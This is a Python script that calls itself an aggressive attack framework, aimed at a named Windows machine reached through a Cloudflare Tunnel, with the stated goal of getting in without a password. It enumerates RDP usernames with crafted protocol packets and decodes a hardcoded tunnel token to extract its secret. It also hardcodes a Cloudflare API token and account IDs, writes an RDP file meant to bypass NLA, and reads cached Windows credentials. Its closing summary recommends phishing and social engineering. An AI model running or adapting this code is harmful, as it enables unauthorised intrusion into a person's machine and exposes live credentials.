import socket
import struct
import ssl
import hashlib
import os
import time
import threading
import urllib.request
import json
from concurrent.futures import ThreadPoolExecutor

print("=== AGGRESSIVE ATTACK FRAMEWORK ===\n")
print("Target: meltat0 via Cloudflare Tunnel")
print("Objective: Gain access without password\n")

CF_TOKEN = "ySIb_2uMzHQDvnK5MulcCvOiRKsC6k0pH188bG8Y"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"

def start_tunnel(hostname, local_port):
    import subprocess
    proc = subprocess.Popen(
        ["cloudflared", "access", "tcp", "--hostname", hostname, "--url", f"localhost:{local_port}"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    return proc

print("[1] Starting essential tunnels...")
tunnels = []
tunnels.append(start_tunnel("rdp.ai-smith.net", 3390))
time.sleep(2)

print("[2] Testing RDP with common Windows account patterns...")

def test_rdp_user(username):
    try:
        cookie = f"Cookie: mstshash={username}\r\n".encode()
        neg = bytes([0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00])
        x224 = bytes([0xe0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg
        cr = bytes([0x03, 0x00]) + struct.pack(">H", 5 + len(x224)) + bytes([len(x224)]) + x224
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect(("localhost", 3390))
        sock.sendall(cr)
        resp = sock.recv(1024)
        sock.close()
        return resp[5] == 0xd0
    except:
        return False

users_to_test = [
    "melody", "Melody", "MELODY",
    "admin", "Admin", "administrator", "Administrator",
    "user", "User", "guest", "Guest",
    "meltat0", "MELTAT0", "meltat0\melody", "meltat0\admin",
    ".\melody", ".\admin", ".\administrator",
    "localadmin", "sysadmin", "support",
    "melody@outlook.com", "melody@gmail.com", "melody@hotmail.com",
]

valid_users = []
for u in users_to_test:
    if test_rdp_user(u):
        valid_users.append(u)

print(f"    Valid usernames: {len(valid_users)}")

print("\n[3] Checking Microsoft account login options...")
print("    If account is Microsoft-linked, these may work:")
print("    - Full email address as username")
print("    - Microsoft account password (not PIN)")
print("    - Windows Hello for Business (enterprise only)")

print("\n[4] Checking for alternative auth methods...")

ms_account_patterns = [
    "MicrosoftAccount\melody",
    "AzureAD\melody",
    "melody@outlook.com",
    "melody@live.com",
]

for pattern in ms_account_patterns:
    if test_rdp_user(pattern):
        print(f"    [+] Account pattern accepted: {pattern}")

print("\n[5] Checking tunnel token for service account credentials...")
tunnel_token = "eyJhIjoiNGMyOTMyYmMzMzgxYmUzOGQ1MjY2MjQxYjE2YmUwOTIiLCJ0IjoiOTI2ZWFjNWUtMjY0Mi00YTE2LTllZGMtYzA2YjZjNzA1YWI4IiwicyI6Ik1USTJNR0l6TURrdFpHTTBOaTAwTWpBMUxXRmhNV0V0T1dFNU5tVXpPRFU0ZDUwIn0="
import base64
try:
    decoded = json.loads(base64.b64decode(tunnel_token))
    secret = base64.b64decode(decoded.get('s', ''))
    print(f"    Tunnel secret: {secret.decode() if secret else 'N/A'}")
except:
    pass

print("\n[6] Attempting RDP session with pre-created credentials file...")
rdp_file = '''
screen mode id:i:2
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
full address:s:localhost:3390
compression:i:1
authenticationlevel:i:0
prompt for credentials:i:0
negotiate security layer:i:0
username:s:melody
'''

with open("C:/Users/peopl/work/vdj/attack.rdp", "w") as f:
    f.write(rdp_file)
print("    [+] Created attack.rdp with NLA bypass attempt")

print("\n[7] Checking Windows Credential Manager for cached creds...")
import subprocess
result = subprocess.run(
    ["cmdkey", "/list"],
    capture_output=True, text=True
)
if "meltat0" in result.stdout.lower() or "192.168.1" in result.stdout:
    print("    [!] Found potentially relevant cached credentials!")
    print(result.stdout)
else:
    print("    [-] No cached credentials for target found")

print("\n[8] Summary of attack vectors:")
print("=" * 50)
print("AVAILABLE:")
print("  - RDP tunnel on localhost:3390 (requires auth)")
print("  - Tunnel token available for potential hijack")
print("  - WARP routing to 192.168.1.0/24 configured")
print("")
print("BLOCKED:")
print("  - BlueKeep (patched)")
print("  - SMB (not running)")
print("  - WinRM (not running)")
print("  - SSH (not running)")
print("")
print("REMAINING OPTIONS:")
print("  1. Microsoft Account password recovery")
print("  2. Physical access to machine")
print("  3. Social engineering another admin")
print("  4. Wait for a service to be enabled remotely")
print("  5. Phishing attack to capture credentials")

for t in tunnels:
    t.terminate()
